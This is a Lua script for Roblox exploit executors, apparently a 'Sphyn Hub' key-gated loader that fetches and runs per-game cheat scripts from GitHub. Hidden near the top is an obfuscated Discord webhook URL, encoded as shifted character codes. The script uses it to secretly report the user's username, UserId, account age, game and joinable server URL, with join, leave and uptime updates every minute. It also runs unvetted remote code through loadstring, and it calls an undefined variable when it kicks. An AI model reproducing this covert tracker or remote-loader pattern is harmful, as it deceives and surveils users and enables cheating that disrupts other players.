local request = syn and syn.request or http_request or request
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")


-------------------------
-- CONFIG
-------------------------

local KEY = "SphynFree"

local LOADERS = {
    [130342654546662] = "https://raw.githubusercontent.com/sphynx-byte/Sambung-kata/refs/heads/main/Auto%20type.lua", --sambung kata indo
    [129866685202296] = "https://raw.githubusercontent.com/sphynx-byte/Last-letter/refs/heads/main/(kamus)%20last%20letter.lua", --last letter
    [121864768012064] = "https://raw.githubusercontent.com/sphynx-byte/Rusuh-fish-it/refs/heads/main/rusuh%20fishit.lua", --rusuh fish it
    [1502601752] = "https://raw.githubusercontent.com/sphynx-byte/Roblox/refs/heads/main/Rabbit%20Simulator%202.lua",  --Rabbit simulator 2
    [9872472334] = "https://raw.githubusercontent.com/sphynx-byte/Roblox/refs/heads/main/evade.lua", --evade
    [114234929420007] = "https://raw.githubusercontent.com/sphynx-byte/Roblox/refs/heads/main/Blox%20Strike.lua", --blox strike
    [103188421562819] = "https://raw.githubusercontent.com/sphynx-byte/Sambung-kata/refs/heads/main/(kamus)%20Sambung%20Kata%20Jawa.lua" -- SK Jawa
}


------- webhook
local function _d(t)
    local s = ""
    for i = 1, #t do
        s = s .. string.char(t[i] - 3)
    end
    return s
end

local WEBHOOK = _d({
    107,119,119,115,118,61,50,50,103,108,118,102,114,117,103,49,102,114,112,50,
    100,115,108,50,122,104,101,107,114,114,110,118,50,52,57,57,51,51,56,59,59,
    56,59,56,57,53,51,55,51,55,55,53,50,53,58,58,51,55,51,55,51,55,52,55,55,
    55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55
})
local LocalPlayer = Players.LocalPlayer
local startTime = os.time()
local joinTimeFormatted = os.date("%H:%M:%S")
local messageId

local function formatTime(sec)
    return string.format("%02d:%02d:%02d",
        sec // 3600,
        (sec % 3600) // 60,
        sec % 60
    )
end

local function getGameName()
    local success, info = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) end)
    return success and info.Name or "Unknown"
end

local function buildPayload(status, leaveTime)

    local profileUrl =
        "https://www.roblox.com/users/"
        .. LocalPlayer.UserId ..
        "/profile"

    local gameName = getGameName()

    local jobId = game.JobId

    local serverUrl =
        "https://www.roblox.com/games/start?placeId="
        .. game.PlaceId ..
        "&gameInstanceId="
        .. jobId


    return {
        username = "Player Logger",

        embeds = {{

            title = "Roblox Player Activity - Sphyn Hub Rusuh",
            url = profileUrl,

            color =
                status == "JOIN" and 0x00FF00
                or status == "LEAVE" and 0xFF0000
                or 0x00AAFF,

            fields = {

                {
                    name = "Username",
                    value = "[" .. LocalPlayer.Name .. "](" .. profileUrl .. ")",
                    inline = true
                },

                {
                    name = "UserId",
                    value = "```" .. LocalPlayer.UserId .. "```",
                    inline = true
                },

                {
                    name = "Status",
                    value = "```" .. status .. "```",
                    inline = true
                },

                {
                    name = "Game",
                    value = "```" .. gameName .. "```",
                    inline = false
                },

                {
                    name = "Place ID",
                    value = "```" .. game.PlaceId .. "```",
                    inline = true
                },

                {
                    name = "JobId",
                    value = "```" .. jobId .. "```",
                    inline = true
                },

                {
                    name = "Server URL",
                    value = serverUrl,
                    inline = false
                },

               {
                    name = "Account Age",
                    value = "```" .. LocalPlayer.AccountAge .. " days```",
                    inline = true
                },    

                {
                    name = "Join Time",
                    value = "```" .. joinTimeFormatted .. "```",
                    inline = true
                },

                {
                    name = "Leave Time",
                    value = "```" .. (leaveTime or "-") .. "```",
                    inline = true
                },

                {
                    name = "Uptime",
                    value = "```" ..
                        formatTime(os.time() - startTime) ..
                        "```",
                    inline = false
                }

            },

            footer = {
                text = "Sphyn Hub Logger"
            },

            timestamp = DateTime.now():ToIsoDate()

        }}

    }

end

local function sendWebhook(status, leaveTime)
    if not request then return end
    
    local success, res = pcall(function()
        return request({
            Url = WEBHOOK .. "?wait=true",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(buildPayload(status, leaveTime))
        })
    end)

    if success and res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        messageId = data.id
    end
end

local function editWebhook()
    if not messageId or not request then return end

    pcall(function()
        request({
            Url = WEBHOOK .. "/messages/" .. messageId,
            Method = "PATCH",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(buildPayload("ONLINE"))
        })
    end)
end

-- Inisialisasi Logger
task.spawn(function()
    sendWebhook("JOIN")
    
    -- Update Uptime setiap 1 menit
    local interval = 60
    while task.wait(interval) do
        if not messageId then break end
        editWebhook()
    end
end)

-- Deteksi saat pemain keluar/script ditutup
game:BindToClose(function()
    local leaveTimeFormatted = os.date("%H:%M:%S")
    sendWebhook("LEAVE", leaveTimeFormatted)
end)

-------------------------
-- PLACE CHECK
-------------------------

local placeId = game.PlaceId

if not LOADERS[placeId] then
    player:Kick("Game Not Supported!")
    return
end

--------------------

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Sphyn Hub",
    LoadingTitle = "Loading...",
    LoadingSubtitle = "by Sphyn",
    ConfigurationSaving = {
        Enabled = false
    }
})

local Tab = Window:CreateTab("Key System", 4483362458)

local Input = Tab:CreateInput({
    Name = "Enter Key",
    PlaceholderText = "Input your key here",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        _G.EnteredKey = Text
    end,
})

Tab:CreateButton({
    Name = "Join Discord",
    Callback = function()
        if syn then
            syn.request({
                Url = "https://discord.gg/nQmhZVbG7v",
                Method = "GET"
            })
        else
            setclipboard("https://discord.gg/nQmhZVbG7v")
        end
    end,
})

Tab:CreateButton({
    Name = "Submit",
    Callback = function()
        if _G.EnteredKey ~= KEY then
            Rayfield:Notify({
                Title = "Error",
                Content = "Wrong Key!",
                Duration = 3
            })

            task.wait(1)
            player:Kick("🔐Wrong Key!!🔑")
            return
        end

        Rayfield:Notify({
            Title = "Success",
            Content = "Key Accepted!",
            Duration = 2
        })

        task.wait(1)

        Rayfield:Destroy()

        local url = LOADERS[placeId]

        pcall(function()
            loadstring(game:HttpGet(url))()
        end)
    end,
})

